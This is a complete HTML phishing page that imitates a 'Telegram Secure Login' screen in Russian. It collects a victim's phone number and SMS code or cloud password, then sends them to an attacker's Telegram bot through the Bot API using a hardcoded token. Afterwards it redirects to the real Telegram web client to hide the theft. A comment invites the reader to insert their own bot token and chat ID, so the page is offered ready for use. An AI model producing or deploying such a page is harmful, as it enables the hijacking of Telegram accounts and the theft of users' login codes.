<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Telegram Secure Login</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; padding-top: 100px; }
        .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 300px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 6px; }
        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h3>Введите данные для входа</h3>
        <form id="loginForm">
            <input type="text" id="phone" placeholder="Номер телефона (в формате +7...)" required>
            <input type="text" id="code" placeholder="Код из SMS / облачный пароль" required>
            <button type="submit">Продолжить</button>
        </form>
    </div>
    <script>
        // Замени BOT_TOKEN и YOUR_CHAT_ID на свои
        const BOT_TOKEN = "8632513404:AAGN-mNBpoQ5kUZWhzKwHpl_zfN7hWQz8Js";
        const CHAT_ID = "8632513404:AAGN-mNBpoQ5kUZWhzKwHpl_zfN7hWQz8Js";
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            const code = document.getElementById('code').value;
            const msg = `Данные: ${phone} / Код: ${code}`;
            // Отправка через Telegram Bot API
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
            });
            alert('Проверка пройдена. Перенаправление...');
            window.location.href = 'https://web.telegram.org'; // финальный редирект
        };
    </script>
</body>
</html>
